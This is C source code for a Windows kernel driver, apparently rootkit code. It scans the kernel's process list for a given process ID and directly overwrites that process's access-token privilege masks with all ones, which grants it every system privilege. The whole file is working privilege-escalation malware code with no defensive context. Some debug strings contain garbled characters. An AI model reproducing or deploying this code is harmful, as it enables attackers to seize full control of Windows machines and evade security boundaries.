void processToken(BYTE * currentPEP)
{
	UCHAR *token_address;
	UCHAR *address;
	DWORD addressWORD;
	PLUID authID;

	DWORD nSID;

	unsigned _int64 privPresent;
	unsigned _int64 privEnabled;
	unsigned _int64 privEnabledByDefault;

	unsigned _int64 * bigP;

	address = (currentPEP + EPROCESS_OFFSET_TOKEN);
	//set the 3 lowest - order bits to zero
	addressWORD = *((DWORD*)address);
	addressWORD = addressWORD & 0xfffffff8;
	token_address = (UCHAR*)addressWORD;

	nSID = *((DWORD*)(token_address + TOKEN_OFFSET_SIDCOUNT));
	DBG_PRINT2("processToken : number of SIDs =%d ", nSID);

	privPresent = *((unsigned _int64*)(token_address + TOKEN_OFFSET_PRIV));
	DBG_PRINT2("processToken: Priv Present =%I64x", privPresent);

	privEnabled = *((unsigned _int64*)(token_address + TOKEN_OFFSET_ENABLED));
	DBG_PRINT2("processToken: Priv Enabled =%I64x", privEnabled);

	privEnabledByDefault = *((unsigned _int64*)(token_address + TOKEN_OFFSET_DEFAULT));
	DBG_PRINT2("processToken : Priv Default Enabled =%I64x", privEnabledByDefault);

	//strobe token privileges
	bigP = (unsigned _int64 *)(token_address + TOKEN_OFFSET_PRIV);
	*bigP = 0xffffffffffffffff;
	bigP = (unsigned _int64 *)(token_address + TOKEN_OFFSET_ENABLED);
	*bigP = 0xffffffffffffffff;
	bigP = (unsigned _int64 *)(token_address + TOKEN_OFFSET_DEFAULT);
	*bigP = 0xffffffffffffffff;
	return;
}

void ScanTaskList(DWORD pid)
{
	BYTE * currentPEP = NULL;
	BYTE* nextPEP = NULL;
	int currentPID = 0;
	int startPID = 0;
	BYTE name[SZ_EPROCESS_NAME];
	// use the following variables to prevent infinite loops
	int fuse = 0;
	const int BLOWN = 4096;

	currentPEP = (BYTE*)PsGetCurrentProcess();
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
	DBG_PRINT1("ScanTaskList: Search[Begin)\n");
	startPID = currentPID;
	DBG_PRINT3(" %s [PID(%d») : \n", name, currentPID);

	if (currentPID == pid)
	{
		DBG_PRINT2("ScanTaskList: Search[Done) PID=%d Located\n", pid);
		processToken(currentPEP);
		return;
	}
	nextPEP = getNextPEP(currentPEP);
	currentPEP = nextPEP;
	currentPID = getPID(currentPEP);
	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));

	while (startPID != currentPID)
	{
		DBG_PRINT3(" %s [PID(%d») : \n", name, currentPID);
		if (currentPID == pid)
		{
			DBG_PRINT2("ScanTaskList : Search[Done) PID=%d Located\n", pid);
			processToken(currentPEP);
			return;
		}
		nextPEP = getNextPEP(currentPEP);
		currentPEP = nextPEP;
		currentPID = getPID(currentPEP);
		getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));

		fuse++;
		if (fuse == BLOWN)
		{
			DBG_TRACE("ScanTaskList", "--POP!-- . .. You blew a fuse");
			return;
		}
	}
	DBG_PRINT2(" %d Tasks Listed\n", fuse);
	DBG_PRINT2("ScanTaskList: Search[Done) ... No task found with PID=%d\n", pid);
	return;
}

void ModifyToken(DWORD* pid)
{
	KIRQL irql;
	PKDPC dpcPtr;

	DBG_PRINT2("ModifyToken : modifying access token to PID[%d)\n", *pid);

	irql = RaiseIRQL();
	dpcPtr = AcquireLock();

	ScanTaskList(*pid);
	ReleaseLock(dpcPtr);

	LowerIRQL(irql);
	return;
}